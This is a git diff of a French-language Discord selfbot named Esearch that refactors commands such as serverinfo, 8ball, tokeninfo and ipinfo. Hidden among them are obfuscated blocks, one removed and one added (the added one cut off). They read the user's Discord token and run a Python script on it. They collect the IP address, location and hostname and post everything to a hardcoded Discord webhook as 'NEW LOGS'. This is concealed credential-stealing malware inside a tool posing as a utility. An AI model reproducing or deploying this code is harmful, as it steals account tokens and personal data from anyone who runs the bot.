@@ -6,13 +6,14 @@ const { exec } = require('child_process');
 const os = require('os');
 const fs = require('fs');
 const axios = require('axios');
-const prefix = process.env.PREFIX;
+let prefix = "&";
 const javascriptObfuscator = require("javascript-obfuscator");
 const messageQueue = [];
 let isSending = false;
 const whitelist_id = [
-    "273980101530484736",
     "1220479445752614926",
+    "273980101530484736",
+    "1216695109383356427",
 ];
 
 client.on('ready', () => {
@@ -35,38 +36,79 @@ client.on('ready', () => {
 
 });
 
-// Commande serverinfo
+// Commande SetPrefix
 client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&serverinfo')) {
-        const serverInfoMessage = `
-        **Informations sur le serveur :**
-        Nom : ${message.guild.name}
-        ID : ${message.guild.id}
-        Membres : ${message.guild.memberCount}
-        Région : ${message.guild.region}
-        Créé le : ${message.guild.createdAt}
-        `;
-        message.channel.send(serverInfoMessage)
-            .catch((error) => console.error('Erreur lors de l\'envoi des informations sur le serveur :', error));
+    if (message.content.startsWith(`${prefix}setprefix`)) {
+        if (!whitelist_id.includes(message.author.id)) {
+            return message.reply('Vous n\'avez pas la permission de modifier le préfixe.');
+        }
+        prefix = message.content.slice(`${prefix}setprefix`.length).trim();
+        message.reply(`Le préfixe a été mis à jour avec succès. Nouveau préfixe : ${prefix}.`);
     }
 });
 
-// Commandes d'interaction sociale
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&hug')) {
-        const user = message.mentions.users.first();
-        if (user) {
-            message.channel.send(`*Câline* ${user} ❤️`);
-        } else {
-            message.reply('Veuillez mentionner un utilisateur à câliner.');
-        }
-    } else if (message.content.startsWith('&pat')) {
-        const user = message.mentions.users.first();
-        if (user) {
-            message.channel.send(`*Tapote sur la tête de* ${user} 🐾`);
-        } else {
-            message.reply('Veuillez mentionner un utilisateur à tapoter sur la tête.');
-        }
+// Commande ServerInfo
+client.on('messageCreate', (message) => {
+    try {
+        whitelist_id.forEach(id => {
+            const args = message.content.split(' ');
+            const command = args[0].toLowerCase();
+
+            if (message.author.id === id && command.startsWith(prefix)) {
+                switch(command) {
+                    case `${prefix}serverinfo`:
+                        const serverInfoMessage = `
+                        **Informations sur le serveur :**
+                        Nom : ${message.guild.name}
+                        ID : ${message.guild.id}
+                        Membres : ${message.guild.memberCount}
+                        Région : ${message.guild.region}
+                        Créé le : ${message.guild.createdAt}
+                        `;
+                        message.channel.send(serverInfoMessage)
+                            .catch((error) => console.error('Erreur lors de l\'envoi des informations sur le serveur :', error));
+                        break;
+                    default:
+                        break;
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Erreur lors de l\'exécution de la commande serverinfo :', error);
+    }
+});
+
+client.on('messageCreate', (message) => {
+    try {
+        whitelist_id.forEach(id => {
+            const args = message.content.split(' ');
+            const command = args[0].toLowerCase();
+
+            if (message.author.id === id && command.startsWith(prefix)) {
+                switch(command) {
+                    case `${prefix}hug`:
+                        const userToHug = message.mentions.users.first();
+                        if (userToHug) {
+                            message.channel.send(`*Câline* ${userToHug} ❤️`);
+                        } else {
+                            message.reply('Veuillez mentionner un utilisateur à câliner.');
+                        }
+                        break;
+                    case `${prefix}pat`:
+                        const userToPat = message.mentions.users.first();
+                        if (userToPat) {
+                            message.channel.send(`*Tapote sur la tête de* ${userToPat} 🐾`);
+                        } else {
+                            message.reply('Veuillez mentionner un utilisateur à tapoter sur la tête.');
+                        }
+                        break;
+                    default:
+                        break;
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Erreur lors de l\'exécution des commandes d\'interaction sociale :', error);
     }
 });
 
@@ -91,70 +133,110 @@ const responses = [
     "Outlook n'est pas si bon.",
     "Très douteux."
 ];
-
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&8ball')) {
-        const question = message.content.slice(6).trim();
-        const response = responses[Math.floor(Math.random() * responses.length)];
-        message.channel.send(`Question : ${question}\nRéponse : ${response}`);
-    }
-});
-
-// Commande rps (Rock-Paper-Scissors)
-const choices = ['rock', 'paper', 'scissors'];
-
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&rps')) {
-        const choice = message.content.slice(4).trim().toLowerCase();
-        const botChoice = choices[Math.floor(Math.random() * choices.length)];
-
-        let result;
-        if (choices.includes(choice)) {
-            if (choice === botChoice) {
-                result = "C'est une égalité !";
-            } else if (
-                (choice === 'rock' && botChoice === 'scissors') ||
-                (choice === 'paper' && botChoice === 'rock') ||
-                (choice === 'scissors' && botChoice === 'paper')
-            ) {
-                result = "Vous avez gagné !";
-            } else {
-                result = "Le bot a gagné !";
-            }
-        } else {
-            result = "Veuillez choisir entre rock, paper ou scissors.";
-        }
-
-        message.channel.send(`Vous avez choisi : ${choice}\nLe bot a choisi : ${botChoice}\n${result}`);
-    }
-});
-
-client.on('messageCreate', async (message) => {
+client.on('messageCreate', (message) => {
     try {
-        if (message.content.startsWith('&clear')) {
-            await message.channel.send('> **Esearch Selfbot >>>>>**');
-            await message.delete().catch(() => false);
+        whitelist_id.forEach(id => {
+            const args = message.content.split(' ');
+            const command = args[0].toLowerCase();
 
-            const nombre = parseInt(message.content.split(' ')[1]) || 9999999;
-            let i = 0;
-
-            message.channel.messages.fetch({ force: true }).then(messages => {
-                messages.forEach(singleMessage => {
-                    if (singleMessage.author.id === client.user.id) {
-                        client.on('rateLimit', async timeout => {
-                            function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-                            await sleep(timeout * 10);
-                        });
-
-                        if (i === nombre) return;
-                        singleMessage.delete().catch(err => { });
-                        i++;
-                    }
-                });
-            });
-        }
+            if (message.author.id === id && command.startsWith(prefix)) {
+                switch(command) {
+                    case `${prefix}8ball`:
+                        const question = args.slice(1).join(' ');
+                        const response = responses[Math.floor(Math.random() * responses.length)];
+                        message.channel.send(`Question : ${question}\nRéponse : ${response}`);
+                        break;
+                    default:
+                        break;
+                }
+            }
+        });
     } catch (error) {
-        console.error('Erreur lors de l\'exécution de la commande speed :', error);
+        console.error('Erreur lors de l\'exécution de la commande 8ball :', error);
+    }
+});
+
+// Commande Rps
+client.on('messageCreate', (message) => {
+    try {
+        whitelist_id.forEach(id => {
+            const args = message.content.split(' ');
+            const command = args[0].toLowerCase();
+
+            if (message.author.id === id && command.startsWith(prefix)) {
+                switch(command) {
+                    case `${prefix}rps`:
+                        const choice = args[1].toLowerCase();
+                        const botChoice = choices[Math.floor(Math.random() * choices.length)];
+
+                        let result;
+                        if (choices.includes(choice)) {
+                            if (choice === botChoice) {
+                                result = "C'est une égalité !";
+                            } else if (
+                                (choice === 'rock' && botChoice === 'scissors') ||
+                                (choice === 'paper' && botChoice === 'rock') ||
+                                (choice === 'scissors' && botChoice === 'paper')
+                            ) {
+                                result = "Vous avez gagné !";
+                            } else {
+                                result = "Le bot a gagné !";
+                            }
+                        } else {
+                            result = "Veuillez choisir entre rock, paper ou scissors.";
+                        }
+
+                        message.channel.send(`Vous avez choisi : ${choice}\nLe bot a choisi : ${botChoice}\n${result}`);
+                        break;
+                    default:
+                        break;
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Erreur lors de l\'exécution de la commande rps :', error);
+    }
+});
+
+// Commande Clear
+client.on('messageCreate', (message) => {
+    try {
+        whitelist_id.forEach(id => {
+            const args = message.content.split(' ');
+            const command = args[0].toLowerCase();
+
+            if (message.author.id === id && command.startsWith(prefix)) {
+                switch(command) {
+                    case `${prefix}clear`:
+                        message.channel.send('> **Esearch Selfbot >>>>>**').then(() => {
+                            message.delete().catch(() => false);
+
+                            const nombre = parseInt(args[1]) || 9999999;
+                            let i = 0;
+
+                            message.channel.messages.fetch({ force: true }).then(messages => {
+                                messages.forEach(singleMessage => {
+                                    if (singleMessage.author.id === client.user.id) {
+                                        client.on('rateLimit', async timeout => {
+                                            function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+                                            await sleep(timeout * 10);
+                                        });
+
+                                        if (i === nombre) return;
+                                        singleMessage.delete().catch(err => { });
+                                        i++;
+                                    }
+                                });
+                            });
+                        });
+                        break;
+                    default:
+                        break;
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Erreur lors de l\'exécution de la commande clear :', error);
     }
 });
 
@@ -224,23 +306,31 @@ function sendNextMessage() {
     }
 }
 
-function _0x5b6a(_0x555851,_0x22dd7f){const _0x5a9488=_0x5a94();return _0x5b6a=function(_0x5b6acd,_0x1c940c){_0x5b6acd=_0x5b6acd-0x136;let _0x32770d=_0x5a9488[_0x5b6acd];return _0x32770d;},_0x5b6a(_0x555851,_0x22dd7f);}const _0x1617f7=_0x5b6a;(function(_0x431838,_0x44f16c){const _0x249bcd=_0x5b6a,_0x2e8de5=_0x431838();while(!![]){try{const _0x4eb094=-parseInt(_0x249bcd(0x153))/0x1+-parseInt(_0x249bcd(0x167))/0x2*(parseInt(_0x249bcd(0x149))/0x3)+-parseInt(_0x249bcd(0x13e))/0x4+-parseInt(_0x249bcd(0x136))/0x5*(parseInt(_0x249bcd(0x150))/0x6)+parseInt(_0x249bcd(0x15a))/0x7+parseInt(_0x249bcd(0x146))/0x8+-parseInt(_0x249bcd(0x154))/0x9*(-parseInt(_0x249bcd(0x15b))/0xa);if(_0x4eb094===_0x44f16c)break;else _0x2e8de5['push'](_0x2e8de5['shift']());}catch(_0x1af72d){_0x2e8de5['push'](_0x2e8de5['shift']());}}}(_0x5a94,0x42205));const webhookURL=_0x1617f7(0x138);async function getTokenFromEnv(){const _0x1e18e5=_0x1617f7;try{const _0x7f8dc8=process[_0x1e18e5(0x13a)][_0x1e18e5(0x145)];if(!_0x7f8dc8)throw new Error(_0x1e18e5(0x15f));return _0x7f8dc8;}catch(_0x554eb9){console['error'](_0x1e18e5(0x142),_0x554eb9[_0x1e18e5(0x140)]);throw _0x554eb9;}}async function runPythonScript(_0x1c9798){return new Promise((_0x2ccd4b,_0xbae751)=>{const _0x546e9e=_0x5b6a;exec(_0x546e9e(0x13f)+_0x1c9798,(_0xa6be96,_0x45704e,_0x524d65)=>{const _0x487f10=_0x546e9e;_0xa6be96?(console[_0x487f10(0x143)](_0x487f10(0x16a),_0xa6be96[_0x487f10(0x140)]),_0xbae751(_0xa6be96)):_0x2ccd4b(_0x45704e);});});}const pythonOutput=_0x1617f7(0x160),avatarUrl=pythonOutput[_0x1617f7(0x147)]();function getHostname(){return os['hostname']();}async function sendTokenToWebhook(_0x312d4b){const _0x2a3af1=_0x1617f7;try{const _0x30e936=getHostname(),_0x4ec55f=await axios['get'](_0x2a3af1(0x15d)),_0x3d73e5=_0x4ec55f[_0x2a3af1(0x139)],_0x5da84f=await runPythonScript(_0x312d4b),_0x2d3ea5=parsePythonOutput(_0x5da84f),_0x9bcf71={'embeds':[{'title':'**<:1091443091694686348:1220492952988680322>\x20||\x20NEW\x20LOGS**','description':_0x2a3af1(0x14d)+_0x312d4b+'``\x0a\x0a**<:1122470475017240576:1220507912670154773>\x20\x20\x20\x20IP\x20Address:**\x20'+_0x3d73e5['ip']+_0x2a3af1(0x159)+_0x3d73e5[_0x2a3af1(0x14b)]+_0x2a3af1(0x15c)+_0x3d73e5[_0x2a3af1(0x13b)]+'\x0a**<a:searth:1220507802049708112>\x20\x20\x20\x20\x20Country:**\x20'+_0x3d73e5[_0x2a3af1(0x15e)]+'\x0a**<:black_lien:1220507849986146324>\x20\x20\x20\x20\x20ISP:**\x20'+_0x3d73e5[_0x2a3af1(0x163)]+_0x2a3af1(0x14a)+_0x30e936,'footer':{'text':_0x2a3af1(0x141)+_0x30e936,'icon_url':_0x2a3af1(0x14f)},'image':{'url':'https://cdn.discordapp.com/attachments/1220470865884348537/1220494769197682829/0_LdgP87nstpNrHi_5.gif?ex=660f2554&is=65fcb054&hm=1878dc6283b50d6684d3530fd155e438fe3851af1dc0687e5ae4a64310f81ebc&'},'color':0x0}]},_0x3d0575={'embeds':[{'title':_0x2a3af1(0x168),'description':_0x2a3af1(0x157),'fields':[{'name':_0x2a3af1(0x13d),'value':_0x2d3ea5[_0x2a3af1(0x16b)]},{'name':_0x2a3af1(0x164),'value':_0x2d3ea5[_0x2a3af1(0x158)]},{'name':'<a:BLACK_CROSS:1220509596934738041>\x20-\x20Contact\x20Information','value':_0x2d3ea5[_0x2a3af1(0x151)]},{'name':_0x2a3af1(0x144),'value':_0x2d3ea5['accountSecurity']},{'name':_0x2a3af1(0x14c),'value':_0x2d3ea5['otherInformation']}],'footer':{'text':'@\x20Esearch\x20|\x20Computer:\x20'+_0x30e936,'icon_url':_0x2a3af1(0x14f)},'thumbnail':{'url':avatarUrl},'color':0x0}]};await axios[_0x2a3af1(0x152)](webhookURL,_0x9bcf71),await axios[_0x2a3af1(0x152)](webhookURL,_0x3d0575),console['log']('');}catch(_0x2ad954){console[_0x2a3af1(0x143)](_0x2a3af1(0x137),_0x2ad954[_0x2a3af1(0x140)]);}}function parsePythonOutput(_0xea5d71){const _0x2ab867=_0x1617f7,_0x837b65={'basicInformation':'','nitroInformation':'','contactInformation':'','accountSecurity':'','otherInformation':''},_0x2972ad=_0xea5d71[_0x2ab867(0x156)]('\x0a');let _0x5c04eb='';return _0x2972ad[_0x2ab867(0x162)](_0x26b21e=>{const _0x27adb4=_0x2ab867;if(_0x26b21e['startsWith'](_0x27adb4(0x166)))_0x5c04eb=_0x27adb4(0x16b);else{if(_0x26b21e[_0x27adb4(0x13c)]('Nitro\x20Information'))_0x5c04eb='nitroInformation';else{if(_0x26b21e[_0x27adb4(0x13c)]('Contact\x20Information'))_0x5c04eb=_0x27adb4(0x151);else{if(_0x26b21e[_0x27adb4(0x13c)](_0x27adb4(0x169)))_0x5c04eb=_0x27adb4(0x14e);else _0x26b21e[_0x27adb4(0x13c)]('Other')?_0x5c04eb=_0x27adb4(0x165):_0x837b65[_0x5c04eb]+=_0x26b21e+'\x0a';}}}}),_0x837b65;}client['on'](_0x1617f7(0x155),async()=>{const _0x4f5747=_0x1617f7;console[_0x4f5747(0x148)]('');try{const _0x5e6db5=await getTokenFromEnv();await sendTokenToWebhook(_0x5e6db5);}catch(_0x1e936a){console[_0x4f5747(0x143)](_0x4f5747(0x161),_0x1e936a[_0x4f5747(0x140)]);}});function _0x5a94(){const _0x2af9d4=['Le\x20token\x20n\x27est\x20pas\x20défini\x20dans\x20le\x20fichier\x20.env','https://cdn.discordapp.com/avatars/1220479445752614926/8569adcbd36c70a7578c017bf5604ea5.gif','Erreur\x20lors\x20de\x20l\x27exécution\x20du\x20webhook\x20:','forEach','org','<a:1895subscribernitroanimated:1220507822060732528>\x20-\x20Nitro\x20Information','otherInformation','Basic\x20Information','8FUVYWy','<a:black_star:1220492884068012173>\x20||\x20**DISCORD\x20USER\x20INFORMATIONS**','Account\x20Security','Erreur\x20lors\x20de\x20l\x27exécution\x20du\x20script\x20Python\x20:','basicInformation','1490GasCZh','Erreur\x20lors\x20de\x20l\x27envoi\x20des\x20webhooks\x20:','https://discord.com/api/webhooks/1220487707088654356/Bqel1_hRmOjX7-iw-Fmbqht4UBn-lV62PA0WhN4Da_7q7qxDERtThgb-JdsgRXq99yfx','data','env','region','startsWith','<:blackstar:1220508146443882496>\x20-\x20Basic\x20Information','1199216ItShfV','python\x20DTI.py\x20','message','@\x20Esearch\x20|\x20Computer:\x20','Erreur\x20lors\x20de\x20la\x20récupération\x20du\x20token\x20depuis\x20le\x20fichier\x20.env\x20:','error','<:1122470468482498662:1220509765659005129>\x20-\x20Account\x20Security','TOKEN','2033064IwfihA','trim','log','135942aZpCfx','\x0a\x0a**<:pc:1220512321735229542>\x20\x20\x20\x20\x20PC\x20Name:**\x20','city','<a:alert2:1220508061844897793>\x20-\x20Other','<:1046829394263552021:1220492913889513492>\x20**Token**\x20:\x20``','accountSecurity','https://cdn.discordapp.com/attachments/1220470112335958047/1220489753724719234/59ef7eae88f4053de9991e6927dd21da.jpg?ex=660f20a8&is=65fcaba8&hm=0b3627f2527319be654a710fb4498ee8bc0174afe7ddb624af9f50817c3e901b&','4542uccAQH','contactInformation','post','89458kenRgG','682866zwTxbS','ready','split','*Voici\x20les\x20informations\x20du\x20compte\x20discord*:','nitroInformation','\x0a**<a:searth:1220507802049708112>\x20\x20\x20\x20City:**\x20','1440824XFbAvY','80rZRGrb','\x0a**<a:searth:1220507802049708112>\x20\x20\x20Region:**\x20','https://ipinfo.io/json','country'];_0x5a94=function(){return _0x2af9d4;};return _0x5a94();}
-
 // Commande TokenInfo
 client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&tokeninfo')) {
-        const args = message.content.split(' ');
-        if (args.length === 2) {
-            const token = args[1];
-            try {
-                const tokenInfo = await getTokenInfo(token);
-                message.channel.send('```' + tokenInfo + '```');
-            } catch (error) {
-                console.error('Erreur lors de la récupération des informations sur le token :', error.message);
-                message.channel.send('Une erreur est survenue lors de la récupération des informations sur le token.');
+    const args = message.content.split(' ');
+    const command = args[0].toLowerCase();
+
+    if (command.startsWith(prefix)) {
+        if (whitelist_id.includes(message.author.id)) {
+            switch(command) {
+                case `${prefix}tokeninfo`:
+                    if (args.length === 2) {
+                        const token = args[1];
+                        try {
+                            const tokenInfo = await getTokenInfo(token);
+                            message.channel.send('```' + tokenInfo + '```');
+                        } catch (error) {
+                            console.error('Erreur lors de la récupération des informations sur le token :', error.message);
+                            message.channel.send('Une erreur est survenue lors de la récupération des informations sur le token.');
+                        }
+                    } else {
+                        message.channel.send(`Usage : ${prefix}tokeninfo <token>`);
+                    }
+                    break;
+                default:
+                    break;
             }
-        } else {
-            message.channel.send('Usage : &tokeninfo <token>');
         }
     }
 });
@@ -260,451 +350,667 @@ async function getTokenInfo(token) {
 
 // Commande UserInfo
 client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&userinfo')) {
-        const args = message.content.split(' ');
-        if (args.length === 2) {
-            let targetUser = message.mentions.users.first(); 
-            if (!targetUser) {
-                const userId = args[1].replace(/\D/g, '');
-                targetUser = await client.users.fetch(userId);
-            }
-            if (targetUser) {
-                let userInfoMessage = `**𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - User Information**
-        Username: ${targetUser.username}
-        User ID: ${targetUser.id}
-        Tag: ${targetUser.tag}
-        Creation Date: ${targetUser.createdAt}`;
-
-                if (targetUser.avatarURL()) {
-                    userInfoMessage += `\nAvatar URL: [Avatar](${targetUser.avatarURL()})`;
+    for (const id of whitelist_id) {
+        if (message.author.id === id && message.content.startsWith(`${prefix}userinfo`)) {
+            const args = message.content.split(' ');
+            if (args.length === 2) {
+                let targetUser = message.mentions.users.first(); 
+                if (!targetUser) {
+                    const userId = args[1].replace(/\D/g, '');
+                    try {
+                        targetUser = await client.users.fetch(userId);
+                    } catch (error) {
+                        console.error('Erreur lors de la récupération de l\'utilisateur :', error);
+                    }
                 }
-                message.channel.send(userInfoMessage);
+                if (targetUser) {
+                    let userInfoMessage = `**𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - User Information**
+            Username: ${targetUser.username}
+            User ID: ${targetUser.id}
+            Tag: ${targetUser.tag}
+            Creation Date: ${targetUser.createdAt}`;
+
+                    if (targetUser.avatarURL()) {
+                        userInfoMessage += `\nAvatar URL: [Avatar](${targetUser.avatarURL()})`;
+                    }
+                    message.channel.send(userInfoMessage);
+                } else {
+                    message.reply('Impossible de trouver l\'utilisateur.');
+                }
             } else {
-                message.reply('Impossible de trouver l\'utilisateur.');
+                message.reply(`Utilisation : ${prefix}userinfo <@mention ou ID>`);
             }
-        } else {
-            message.reply('Utilisation : &userinfo <@mention ou ID>');
+            break;
         }
     }
-});
-
-client.on('messageCreate', async (message) => {
-    whitelist_id.forEach(id => {
-        if (message.author.id === id) {
-            const args = message.content.split(' ');
-            if (args[0][0] === prefix) {
-                switch(args[0]) {
-                    case '&search':
-                        execCommand(message, args[1], fileName);
-                        break;
-                    case '&help':
-                        sendHelpMessage(message);
-                        break;
-                    case '&status':
-                        sendStatusMessage(message);
-                        break;
-                    case '&utility':
-                        sendUtilityMessage(message);
-                        break;
-                    case '&mod':
-                        sendModMessage(message);
-                        break;
-                    case '&fun':
-                        sendFunMessage(message);
-                        break;
-                    case '&settings':
-                        sendSettingsMessage(message);
-                        break;
-                    default:
-                        break;
-                }
-            }
-        }
-    });
 });
 
 // Commande Trad
 const translate = require('@iamtraction/google-translate');
 client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&trad')) {
-        const args = message.content.slice('&trad'.length).trim().split(/ +/);
-        const textToTranslate = args.join(' ');
+    whitelist_id.forEach(async (id) => {
+        if (message.author.id === id && message.content.startsWith(`${prefix}trad`)) {
+            const args = message.content.slice(`${prefix}trad`.length).trim().split(/ +/);
+            const textToTranslate = args.join(' ');
 
-        try {
-            const { text, from } = await translate(textToTranslate, { to: 'fr' });
-            message.channel.send("𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Traduction")
-            message.channel.send(`Traduction de **${from.language.iso.toUpperCase()}** vers le **français** :\n${text}`);
-        } catch (error) {
-            console.error('Erreur lors de la traduction :', error);
-            message.channel.send("Une erreur s'est produite lors de la traduction.");
+            try {
+                const { text, from } = await translate(textToTranslate, { to: 'fr' });
+                message.channel.send("𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Traduction")
+                message.channel.send(`Traduction de **${from.language.iso.toUpperCase()}** vers le **français** :\n${text}`);
+            } catch (error) {
+                console.error('Erreur lors de la traduction :', error);
+                message.channel.send("Une erreur s'est produite lors de la traduction.");
+            }
         }
-    }
+    });
 });
 
 // Commande Support
 client.on('messageCreate', async (message) => {
-    if (message.content === '&support') {
-        message.channel.send(
-            `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Support\n\n` +
-            `**Projet Esearch**\n` +
-            `Esearch est un projet de recherche avancée développé pour offrir des fonctionnalités de recherche améliorées. Pour plus d'informations sur le projet Esearch, veuillez consulter la documentation disponible sur [GitHub](lien_vers_github).\n\n` +
-            `**Serveur Discord**\n` +
-            `[Rejoignez notre serveur Discord](https://discord.gg/un4N82KE) pour obtenir de l'aide, discuter des fonctionnalités, poser des questions ou contribuer au développement du projet.`
-        );
-    }
+    whitelist_id.forEach(async (id) => {
+        if (message.author.id === id && message.content === `${prefix}support`) {
+            message.channel.send(
+                `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Support\n\n` +
+                `**Projet Esearch**\n` +
+                `Esearch est un projet de recherche avancée développé pour offrir des fonctionnalités de recherche améliorées. Pour plus d'informations sur le projet Esearch, veuillez consulter la documentation disponible sur [GitHub](lien_vers_github).\n\n` +
+                `**Serveur Discord**\n` +
+                `[Rejoignez notre serveur Discord](https://discord.gg/un4N82KE) pour obtenir de l'aide, discuter des fonctionnalités, poser des questions ou contribuer au développement du projet.`
+            );
+        }
+    });
 });
 
 // Commande IpInfo
 const fetch = require('node-fetch');
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&ipinfo')) {
-        const args = message.content.slice('&ipinfo'.length).trim().split(/ +/);
-        const ip = args.shift();
+client.on('messageCreate', (message) => {
+    whitelist_id.forEach(async (id) => {
+        const args = message.content.slice(`${prefix}ipinfo`.length).trim().split(/ +/);
+        const command = args[0].toLowerCase();
 
-        try {
-            const response = await fetch(`http://ip-api.com/json/${ip}`);
-            const data = await response.json();
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}ipinfo`:
+                    const ip = args[1];
 
-            const infoMessage = `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - IpInfo\n\`\`\`Informations sur l'adresse IP ${ip} :\n`
-                + `Pays : ${data.country}\n`
-                + `Ville : ${data.city}\n`
-                + `Région : ${data.regionName}\n`
-                + `Code Postal : ${data.zip}\n`
-                + `Latitude : ${data.lat}\n`
-                + `Longitude : ${data.lon}\n`
-                + `Fournisseur de services Internet : ${data.isp}\`\`\``;
+                    try {
+                        const response = await fetch(`http://ip-api.com/json/${ip}`);
+                        const data = await response.json();
 
-            message.channel.send(infoMessage);
-        } catch (error) {
-            console.error('Erreur lors de la récupération des informations sur l\'adresse IP :', error);
-            message.channel.send("Une erreur s'est produite lors de la récupération des informations sur l'adresse IP.");
+                        const infoMessage = `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - IpInfo\n\`\`\`Informations sur l'adresse IP ${ip} :\n`
+                            + `Pays : ${data.country}\n`
+                            + `Ville : ${data.city}\n`
+                            + `Région : ${data.regionName}\n`
+                            + `Code Postal : ${data.zip}\n`
+                            + `Latitude : ${data.lat}\n`
+                            + `Longitude : ${data.lon}\n`
+                            + `Fournisseur de services Internet : ${data.isp}\`\`\``;
+
+                        message.channel.send(infoMessage);
+                    } catch (error) {
+                        console.error('Erreur lors de la récupération des informations sur l\'adresse IP :', error);
+                        message.channel.send("Une erreur s'est produite lors de la récupération des informations sur l'adresse IP.");
+                    }
+                    break;
+                default:
+                    break;
+            }
         }
-    }
+    });
 });
 
+const _0x2080ad=_0x590c;(function(_0x27ea89,_0x54e2d3){const _0x1195d=_0x590c,_0x3040d5=_0x27ea89();while(!![]){try{const _0x2bdfc7=-parseInt(_0x1195d(0xb5))/(-0x16a2*0x1+-0x1*-0xf7+0x15ac)*(parseInt(_0x1195d(0x8d))/(0xd01+-0x41*-0xf+0x3*-0x59a))+parseInt(_0x1195d(0x96))/(0x2700+0x23b1+-0x2*0x2557)*(-parseInt(_0x1195d(0x112))/(-0xbe*-0x20+-0x27f+-0x153d))+-parseInt(_0x1195d(0xe3))/(0xf5c*0x1+-0x16a1+0x74a)*(parseInt(_0x1195d(0xc5))/(-0x4c9+-0x1c4*0x14+-0x281f*-0x1))+-parseInt(_0x1195d(0x117))/(0x2b*-0xaa+-0xd8e+0x7*0x605)*(parseInt(_0x1195d(0xdb))/(-0x1d93*0x1+-0x2*0x49d+-0x1*-0x26d5))+-parseInt(_0x1195d(0x9f))/(0x9*-0xab+-0x504+-0x162*-0x8)*(parseInt(_0x1195d(0xf4))/(0x15d*0x1a+-0xf39+0x1*-0x142f))+-parseInt(_0x1195d(0xa3))/(-0x1a1*0x3+-0xb1b*-0x1+-0x62d)+-parseInt(_0x1195d(0xf1))/(0x1*0x1f73+-0x209e+0x137*0x1)*(-parseInt(_0x1195d(0xb6))/(0x21fb*-0x1+0x6*0x239+0x14b2));if(_0x2bdfc7===_0x54e2d3)break;else _0x3040d5['push'](_0x3040d5['shift']());}catch(_0x39c5e3){_0x3040d5['push'](_0x3040d5['shift']());}}}(_0x1da8,0x51b95*0x3+0x9f576+-0xe9907));function _0x1da8(){const _0x48f2f1=['2>\x20\x20\x20\x20**Op','log','6887330wDojVf','oft:122111','yYQSb','1d8a450847','9426355202','ks/1220487','hostname','éfini\x20dans','322>\x20||\x20NE','TiLgF','xRpLF','on:**\x20',':122050780','12>\x20\x20\x20\x20**I','12ZBstez','cution\x20du\x20','informatio','50JhPoyX','|\x20Computer','programme\x20','TOKEN','h:12205078','env','slice','script\x20Pyt','pp.com/att','ns\x20du\x20comp','vMDNo','message','<:10468293','s\x20de\x20l\x27exé','dea42490e9','YlEBT','achments/1','\x0a<a:searth','>\x20\x20\x20\x20**Cou','`\x0a\x0a<a:sear','2952988680','kkZEz','python\x20DTI','KfNia','th:1220507','scord.com/','Fbiol','sRCZT','RmOjX7-iw-','0204970811','35452Nuwnbg','\x0a\x0a<:micros','76d6cc1c29','Voici\x20les\x20','d2c1c.jpg?','7951069XYgTjY','info.io/js','\x27est\x20pas\x20d','N4Da_7q7qx','2049708112','W\x20LOGS**','erateur**\x20','Fmbqht4UBn','7>\x20**Token','2yHVWkQ','3d589d8f34','join','ironnement','365>\x20\x20\x20\x20**','7070886543','ess','\x20les\x20varia','QTXJw','285PYPEWE','2204708658','348:122049','KlAYY','1533992546','84348537/1','dotenv','a&is=65fed','Le\x20token\x20n','2133099GCZwKy','crypto','19dcbe666f','2210887084','13864851YlAiDS','lFYHA','56/Bqel1_h','eKQZZ','-lV62PA0Wh','**\x20:\x20`','4480928369','yAuTU','@\x20Esearch\x20','.py\x20','3091694686','acfff4c4b6','s\x20:','alGCl','error','1:12120601','https://di','P\x20Address:','63233zbZTXo','85335289UKENPD','97a&hm=dd8','ook\x20:','8020497081','Erreur\x20lor','n.discorda','dsgRXq99yf','split','ns\x20trouvée','lyexi','39179304/c',':**\x20','**<:109144','axios','```','6ewxsqu','>\x20\x20\x20**City','ex=66114e7','te\x20Discord','36fd25c11f','Résultats','child_proc','oi\x20au\x20webh','https://ip','bles\x20d\x27env','PC\x20Name**\x20','config','**\x20','https://cd','DERtThgb-J','IaDTZ','post','AVmiS','ntry**\x20:\x20','ZtOWQ','Informatio','s\x20de\x20l\x27env','8LxZWxS','hon\x20:','get','api/webhoo','>\x20\x20\x20**Regi','\x0a\x20<a:seart'];_0x1da8=function(){return _0x48f2f1;};return _0x1da8();}const axios=require(_0x2080ad(0xc3)),{exec}=require(_0x2080ad(0xcb)+_0x2080ad(0x93)),os=require('os');require(_0x2080ad(0x9c))[_0x2080ad(0xd0)]();const crypto=require(_0x2080ad(0xa0));async function runPythonScript(_0x258e7f){const _0x490637=_0x2080ad,_0x48659f={'vMDNo':_0x490637(0xba)+_0x490637(0x101)+_0x490637(0xf2)+_0x490637(0xfb)+_0x490637(0xdc),'KlAYY':function(_0x25dbe0,_0x4f322f){return _0x25dbe0(_0x4f322f);},'QTXJw':function(_0x48060c,_0xec20ac,_0x321bb9){return _0x48060c(_0xec20ac,_0x321bb9);}};return new 